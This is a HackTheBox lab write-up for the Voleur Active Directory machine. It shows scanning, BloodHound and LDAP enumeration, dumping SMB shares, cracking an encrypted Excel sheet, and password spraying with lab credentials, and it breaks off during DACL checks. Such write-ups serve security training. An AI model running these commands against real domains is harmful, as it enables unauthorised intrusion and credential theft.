---
render_with_liquid: false
title: HackTheBox Writeup - Voleur
date: 2025-07-09 08:10:19 +1400
tags: [hackthebox, nmap, windows, ad, netexec, assumed-breach, impacket, bloodhound-ce, bloodhound-ce-python, bloodhound-cli, ldeep, bloodyad, smb, discover-notes, xlsx, office2john, hashcat, credentials-exposure, password-spraying, dacl-abuse, targeted-kerberoast, evil-winrm, ad-recyclebin, runascs, discover-backup, dpapi, simplehttpserver, exfiltration, dpapi-py, wsl, wsl-mount, ssh, sudoers, ntds]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f2d4e31-904e-4756-90fe-3d6872323ca1.png
    width: 640
    height: 480
---



Voleur is a medium difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. Start by cracking encrypted excel sheet that contains user credentials, got a user with winrm access to the domain controller via password spraying and DACL abuse, restored a user from AD recycle bin then decrypted its DPAPI credentials from a folder, got a ssh private key to access WSL, we can access mounted `C:\` from host machine as root to dump NTDS backups, and get a shell as domain administrator by parsing the NTDS database.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ pt init '10.129.230.130 DC.voleur.htb voleur.htb DC'
+---------+--------+----------------+---------------+
| PROFILE | STATUS |       IP       |    DOMAIN     |
+---------+--------+----------------+---------------+
| voleur  | on     | 10.129.230.130 | DC.voleur.htb |
| voleur  | on     | 10.129.230.130 | voleur.htb    |
| voleur  | on     | 10.129.230.130 | DC            |
+---------+--------+----------------+---------------+

╒═══════════╤════════════╤═══════════════╤════════════╤════════════════╤═══════════╤═══════════════╕
│ profile   │ lhost      │ rhost         │ domain     │ ip             │ dc_name   │ dc_fqdn       │
╞═══════════╪════════════╪═══════════════╪════════════╪════════════════╪═══════════╪═══════════════╡
│ voleur    │ 10.10.14.9 │ DC.voleur.htb │ voleur.htb │ 10.129.230.130 │ DC        │ DC.voleur.htb │
╘═══════════╧════════════╧═══════════════╧════════════╧════════════════╧═══════════╧═══════════════╛
```


## Nmap

- The **ssh** service on port `2222` has the same TTL (`127`) as other ports, which suggests it's not behind a firewall / reverse proxy, could be **WSL**

```bash
# Nmap 7.95 scan initiated Wed Jul  9 08:10:18 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,49670,49671,55358,62122,62139, 10.129.230.130
Nmap scan report for 10.129.230.130
Host is up, received user-set (0.20s latency).
Scanned at 2025-07-09 08:10:19 CST for 125s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-09 10:44:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55358/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62122/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62139/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48371/tcp): CLEAN (Timeout)
|   Check 2 (port 52843/tcp): CLEAN (Timeout)
|   Check 3 (port 19865/udp): CLEAN (Timeout)
|   Check 4 (port 35346/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 10h34m16s
| smb2-time: 
|   date: 2025-07-09T10:45:59
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  9 08:12:24 2025 -- 1 IP address (1 host up) scanned in 125.94 seconds
```


# User Flag
---

## Auth as ryan.naylor


### Setup AD environment

Get **Domain name** and **Domain Controller** name -> Add to `/etc/hosts` -> Generate kerberos config

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ nxc --timeout 10 smb $(pt get ip) --generate-hosts-file .pt/hosts && cat .pt/hosts | sudo tee -a /etc/hosts && sudo ~/scripts/ad/sync_ntp.sh $(pt get ip) && pt set rhost `cat .pt/hosts | awk '{print $2}' | tail -n1` && pt set domain `cat .pt/hosts | awk '{print $3}' | tail -n1` && nxc --timeout 10 smb -k $(pt get rhost) --generate-krb5-file .pt/krb5.conf && sudo cp .pt/krb5.conf /etc/krb5.conf
SMB         10.129.230.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
10.129.230.130     DC.voleur.htb voleur.htb DC
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-07-09 18:52:27.343591 (+0800) +0.000666 +/- 0.095785 10.129.230.130 s1 no-leap

Done syncing time with NTP server: 10.129.230.130
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
```


### Assumed breach scenario

![](/assets/obsidian/cdb54ba4e1c2e634430a48732b80cb01.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'ryan.naylor' 'HollowOct31Nyt'
[+] Password set for user ryan.naylor

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ nxc smb $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ryan.naylor.ccache
```


## Auth as svc_ldap

### Domain Enumeration


#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -k -no-pass
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 36S
INFO: Compressing output into 20250709185848_bloodhound.zip
```

Start bloodhound

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```


#### bhcli


##### Upload the latest collected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bhcli upload `ls -t *_bloodhound.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20250709185848_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```


##### Statistics

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ VOLEUR.HTB         │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      12 │       9 │
│ Computer Accounts  │       1 │       1 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      55 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘
```


##### Users with description

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bhcli users -d "$(pt get domain)" --description
ADMINISTRATOR@VOLEUR.HTB        Built-in account for administering the computer/domain
GUEST@VOLEUR.HTB        Built-in account for guest access to the computer/domain
JEREMY.COMBS@VOLEUR.HTB Third-Line Support Technician
KRBTGT@VOLEUR.HTB       Key Distribution Center Service Account
LACEY.MILLER@VOLEUR.HTB Second-Line Support Technician
MARIE.BRYANT@VOLEUR.HTB First-Line Support Technician
NT AUTHORITY@VOLEUR.HTB
RYAN.NAYLOR@VOLEUR.HTB  First-Line Support Technician
SVC_BACKUP@VOLEUR.HTB
SVC_IIS@VOLEUR.HTB
SVC_LDAP@VOLEUR.HTB
SVC_WINRM@VOLEUR.HTB
```


##### Audit

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bhcli audit -d "$(pt get domain)"
VOLEUR.HTB
==========

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```


#### Ldeep


##### Query data from LDAP

```bash
mkdir -p ldeep && KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" all ldeep/
```


##### Insight

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 2116676 Jul  9 18:59 ldeep/_schema.lst
-rw-r--r-- 1 bravosec kali    3072 Jul  9 18:59 ldeep/_server_info.lst
-rw-r--r-- 1 bravosec kali    1749 Jul  9 18:59 ldeep/_dns_records.lst
-rw-r--r-- 1 bravosec kali    1139 Jul  9 18:59 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali     339 Jul  9 18:59 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali     335 Jul  9 18:59 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali     195 Jul  9 18:59 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali     136 Jul  9 18:59 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali     116 Jul  9 18:59 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali     109 Jul  9 18:59 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali     103 Jul  9 18:59 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali      30 Jul  9 18:59 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali      24 Jul  9 18:59 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali      19 Jul  9 18:59 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali      19 Jul  9 18:59 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali      14 Jul  9 18:59 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali      13 Jul  9 18:59 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali       6 Jul  9 18:59 ldeep/_users_passwordnotrequired.lst
-rw-r--r-- 1 bravosec kali       4 Jul  9 18:59 ldeep/_machines.lst
```


##### Interesting users

![](/assets/obsidian/7806facdf2353990dcc2ba00854f21ef.png)

![](/assets/obsidian/795c115a95c0dccfc97aa485b8c62735.png)


##### Membership info

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb": [
    "svc_winrm",
    "jeremy.combs"
  ],
  "CN=Third-Line Technicians,DC=voleur,DC=htb": [
    "jeremy.combs"
  ],
  "CN=Restore_Users,DC=voleur,DC=htb": [
    "svc_ldap"
  ],
  "CN=Second-Line Technicians,DC=voleur,DC=htb": [
    "lacey.miller"
  ],
  "CN=First-Line Technicians,DC=voleur,DC=htb": [
    "marie.bryant",
    "ryan.naylor"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=voleur,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=voleur,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=voleur,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=voleur,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=voleur,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=voleur,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=voleur,DC=htb": [
    "Administrator"
  ]
}
```


### User access check


#### AD

![](/assets/obsidian/5563baa90dbd07450b876acc31f69c0d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=Ryan Naylor,OU=First-Line Support Technicians,DC=voleur,DC=htb
permission: WRITE
```


#### SMB Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M spider_plus --smb-timeout 10 --log nxc_shares.log
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] VOLEUR.HTB\ryan.naylor from ccache
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance
SMB         DC.voleur.htb   445    DC               HR
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json".
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ cat ~/".nxc/modules/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2025-01-29 16:49:11  2.72 KB
SYSVOL/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2025-01-30 21:57:03  23 B
SYSVOL/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-01-30 21:57:03  4.01 KB
IT/First-Line Support/Access_Review.xlsx                                                                            2025-01-31 17:09:27  16.5 KB
SYSVOL/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-05-08 08:00:32  1.19 KB
SYSVOL/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2025-05-08 08:01:14  22 B
SYSVOL/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv      2025-05-08 08:01:14  377 B
```


### 445 - SMB : Crack password of an excel sheet

Dump the SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999 OUTPUT_FOLDER='./loot/smb' --smb-timeout 10
/home/kali/.local/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] VOLEUR.HTB\ryan.naylor from ccache
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 95.37 MB
SPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: ./loot/smb
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance
SMB         DC.voleur.htb   445    DC               HR
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to "./loot/smb/DC.voleur.htb.json".
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB
SPIDER_PLUS DC.voleur.htb   445    DC               [*] File unique exts:     5 (xlsx, inf, ini, csv, pol)
SPIDER_PLUS DC.voleur.htb   445    DC               [*] Downloads successful: 7
SPIDER_PLUS DC.voleur.htb   445    DC               [+] All files processed successfully.
```

`IT/First-Line\ Support/Access_Review.xlsx` is an encrypted sheet

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ file loot/smb/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx
loot/smb/DC.voleur.htb/IT/First-Line Support/Access_Review.xlsx: CDFV2 Encrypted
```

Extract the password hash then crack it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ office2john loot/smb/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx | tee loot/smb/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ hashcat loot/smb/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx.hash --user /opt/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting in autodetect mode

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ hashcat loot/smb/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx.hash --user /opt/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

9600 | MS Office 2013 | Document

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```


### Excel sheet contains notes with passwords

Open the sheet then enter the password `football1`

![](/assets/obsidian/350750ce3b9b368951eb497a91b57c3e.png)

- The notes mentioned that `Todd.Wolfe` was an employee who left that has winrm access
- `Jermy.Combs` has access to `Software` share folder
- `Jermy.Combs` potentially owns `svc_backup` account
- 3 passwords found

![](/assets/obsidian/ad7ba00a01b4da63ef0b0fde6908a770.png)


### 88 - Kerberos : Password spray

Let's spray all gathered passwords from the sheet for potential password reuse on other accounts

```bash
cat ldeep/_users_enabled.lst | grep -vf <(cat hashes.lst creds.lst| awk -F: '{print $1}') > users_to_spray.lst && nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u users_to_spray.lst -p 'NightT1meP1dg3on14'
cat ldeep/_users_enabled.lst | grep -vf <(cat hashes.lst creds.lst| awk -F: '{print $1}') > users_to_spray.lst && nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u users_to_spray.lst -p 'M1XyC9pW7qT5Vn'
cat ldeep/_users_enabled.lst | grep -vf <(cat hashes.lst creds.lst| awk -F: '{print $1}') > users_to_spray.lst && nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success -u users_to_spray.lst -p 'N5pXyW1VqM7CZ8'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ cat nxc_kerberos.log | grep '\[.\]' | grep -vE 'KDC_ERR_PREAUTH_FAILED|KDC_ERR_C_PRINCIPAL_UNKNOWN|KDC_ERR_CLIENT_REVOKED|\[\*\]' | awk -F'] ' '{print $NF}' | tee nxc_kerberos.lst
voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
voleur.htb\svc_iis:N5pXyW1VqM7CZ8
```

Request a TGT for `svc_ldap`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'svc_ldap' 'M1XyC9pW7qT5Vn'
[+] Password set for user svc_ldap

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_ldap.ccache
```


## Shell as svc_winrm


### User access check


#### AD

- Since `svc_ldap` is in `restore_users` group, so it has a special right to restore a deleted user `Todd Wolfe`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get writable --include-del

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

